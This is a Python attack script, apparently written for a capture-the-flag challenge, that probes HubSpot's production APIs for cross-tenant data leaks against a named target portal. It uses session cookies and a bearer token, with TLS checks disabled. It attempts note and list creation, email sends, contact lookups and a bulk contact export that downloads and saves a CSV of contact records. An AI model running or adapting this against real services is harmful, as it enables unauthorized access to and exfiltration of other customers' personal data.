#!/usr/bin/env python3
"""
Try to trigger data leaks through UI actions
- Creating tasks/notes for contacts
- Sending emails
- Creating lists/segments
- Export operations
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("UI ACTIONS THAT MIGHT LEAK CONTACT DATA")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. TRY TO CREATE A NOTE FOR CONTACT 1
# ============================================================================

print("\n[1] CREATING NOTE FOR CONTACT - MIGHT SHOW CONTACT NAME")
print("="*80)

# Try to create a note/engagement
note_urls = [
    f'https://api.hubapi.com/engagements/v1/engagements',
    f'https://app.hubspot.com/api/engagements/v1/engagements',
]

note_payload = {
    'engagement': {
        'active': True,
        'type': 'NOTE',
    },
    'associations': {
        'contactIds': [1],
        'companyIds': [],
        'dealIds': []
    },
    'metadata': {
        'body': 'Test note to see if we get contact data back'
    }
}

for url in note_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.post(url, json=note_payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code in [200, 201]:
            print(f"  *** NOTE CREATED! ***")

            try:
                data = r.json()
                print(f"  Response: {json.dumps(data, indent=2)[:500]}")

                # Response might include contact name or other data
                if 'firstname' in json.dumps(data).lower() or 'contact' in json.dumps(data).lower():
                    findings.append({'type': 'note_creation', 'url': url, 'data': data})
            except:
                print(f"  Response: {r.text[:300]}")
        else:
            try:
                error = r.json()
                print(f"  Error: {json.dumps(error, indent=2)[:300]}")

                # Check if error message contains contact info
                if 'firstname' in json.dumps(error).lower():
                    print(f"    *** ERROR CONTAINS CONTACT DATA! ***")
                    findings.append({'type': 'error_leak', 'source': 'note', 'data': error})
            except:
                pass
    except:
        pass

# ============================================================================
# 2. TRY TO SEND EMAIL TO CONTACT
# ============================================================================

print("\n" + "="*80)
print("[2] PREPARING TO SEND EMAIL - MIGHT SHOW CONTACT INFO")
print("="*80)

# Email send endpoints often return contact data for validation
email_send_urls = [
    f'https://api.hubapi.com/marketing/v3/emails/send',
    f'https://app.hubspot.com/api/email/v1/email',
]

email_payload = {
    'portalId': TARGET_PORTAL,
    'to': 'test@example.com',
    'from': 'noreply@hubspot.com',
    'subject': 'Test',
    'body': 'Test email',
    'contactId': 1
}

for url in email_send_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.post(url, json=email_payload, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** EMAIL ENDPOINT ACCESSIBLE! ***")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")

                if 'firstname' in json.dumps(data).lower():
                    findings.append({'type': 'email_send', 'url': url, 'data': data})
            except:
                pass
    except:
        pass

# ============================================================================
# 3. TRY TO CREATE A LIST/SEGMENT WITH CONTACT 1
# ============================================================================

print("\n" + "="*80)
print("[3] CREATING LIST WITH CONTACT - MIGHT RETURN CONTACT DATA")
print("="*80)

list_create_url = f'https://api.hubapi.com/contacts/v1/lists'

list_payload = {
    'name': 'CTF Test List',
    'portalId': TARGET_PORTAL,
    'dynamic': False,
    'filters': [[{
        'property': 'hs_object_id',
        'operator': 'EQ',
        'value': '1'
    }]]
}

try:
    r = session.post(list_create_url, json=list_payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

    print(f"Status: {r.status_code}")

    if r.status_code in [200, 201]:
        print(f"*** LIST CREATED! ***")

        try:
            data = r.json()
            print(f"Response: {json.dumps(data, indent=2)[:400]}")

            list_id = data.get('listId')

            if list_id:
                print(f"\nList ID: {list_id}")
                print(f"Now trying to get contacts from this list...")

                # Try to get contacts from the list
                contacts_url = f'https://api.hubapi.com/contacts/v1/lists/{list_id}/contacts/all'

                r2 = session.get(contacts_url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

                if r2.status_code == 200:
                    print(f"*** GOT CONTACTS FROM LIST! ***")

                    try:
                        list_data = r2.json()
                        print(f"{json.dumps(list_data, indent=2)[:600]}")

                        if 'super_secret' in json.dumps(list_data).lower():
                            print(f"\n*** CTF FLAG FOUND IN LIST! ***")
                            findings.append({'type': 'list_contacts', 'list_id': list_id, 'data': list_data})
                    except:
                        pass
        except:
            pass
    else:
        try:
            error = r.json()
            print(f"Error: {json.dumps(error, indent=2)[:300]}")
        except:
            pass
except:
    pass

# ============================================================================
# 4. TRY TO GET CONTACT VIA EMAIL LOOKUP
# ============================================================================

print("\n" + "="*80)
print("[4] CONTACT LOOKUP BY EMAIL (PUBLIC API)")
print("="*80)

# Try common email patterns for a CTF contact
test_emails = [
    f'ctf@{TARGET_PORTAL}.com',
    f'test@{TARGET_PORTAL}.com',
    f'contact@{TARGET_PORTAL}.com',
    'ctf@hubspot.com',
    'challenge@hubspot.com',
]

email_lookup_url = 'https://api.hubapi.com/contacts/v1/contact/email/{email}/profile'

for email in test_emails:
    url = email_lookup_url.format(email=email)

    print(f"\n{email}:")

    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** CONTACT FOUND! ***")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:500]}")

                # Check portal
                portal_id = data.get('portal-id') or data.get('portalId')

                if str(portal_id) == TARGET_PORTAL:
                    print(f"  *** FROM TARGET PORTAL! ***")

                    if 'super_secret' in json.dumps(data).lower():
                        print(f"  *** CTF FLAG FOUND! ***")
                        findings.append({'type': 'email_lookup', 'email': email, 'data': data})
            except:
                pass
    except:
        pass

# ============================================================================
# 5. TRY TO EXPORT CONTACTS VIA UI
# ============================================================================

print("\n" + "="*80)
print("[5] TRIGGERING CONTACT EXPORT")
print("="*80)

export_urls = [
    f'https://app.hubspot.com/api/crm/v3/exports/export',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/export/contacts',
]

export_payload = {
    'portalId': TARGET_PORTAL,
    'exportType': 'contacts',
    'properties': ['firstname', 'super_secret', 'email'],
    'filters': []
}

for url in export_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.post(url, json=export_payload, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code in [200, 201]:
            print(f"  *** EXPORT TRIGGERED! ***")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")

                # Check if we get a download URL
                if 'url' in data or 'downloadUrl' in data:
                    download_url = data.get('url') or data.get('downloadUrl')

                    print(f"\n  Download URL: {download_url}")
                    print(f"  Attempting to download...")

                    r2 = session.get(download_url, verify=False, timeout=15)

                    if r2.status_code == 200:
                        print(f"    *** DOWNLOAD SUCCESSFUL! ***")
                        print(f"    Size: {len(r2.content)} bytes")

                        with open('/home/user/Hub/findings/contact_export.csv', 'wb') as f:
                            f.write(r2.content)

                        print(f"    Saved to findings/contact_export.csv")

                        if b'super_secret' in r2.content:
                            print(f"\n    *** CTF FLAG IN EXPORT! ***")
                            findings.append({'type': 'export_download', 'url': download_url})
            except:
                pass
    except:
        pass

# ============================================================================
# 6. CHECK FOR CONTACT IN WORKFLOWS/AUTOMATION
# ============================================================================

print("\n" + "="*80)
print("[6] CHECKING WORKFLOW ENROLLMENTS")
print("="*80)

workflow_urls = [
    f'https://api.hubapi.com/automation/v4/flows/{TARGET_PORTAL}/enrollments',
    f'https://app.hubspot.com/workflows/{TARGET_PORTAL}/flow/{{workflow_id}}/history',
]

# Try to get enrolled contacts (might show their data)
enrollment_url = f'https://api.hubapi.com/automation/v2/workflows/enrollments/contacts/1'

try:
    r = session.get(enrollment_url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

    print(f"Status: {r.status_code}")

    if r.status_code == 200:
        print(f"*** ENROLLMENT DATA ACCESSIBLE! ***")

        try:
            data = r.json()
            print(f"{json.dumps(data, indent=2)[:400]}")
        except:
            pass
except:
    pass

print("\n" + "="*80)
print("UI ACTIONS TESTING COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} DATA LEAKS! ***\n")

    with open('/home/user/Hub/findings/UI_ACTION_FINDINGS.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:600]}")

        if 'super_secret' in json.dumps(finding).lower():
            print(f"\n*** CTF FLAG FOUND! ***")
else:
    print("\nNo data leaks found through UI actions.")
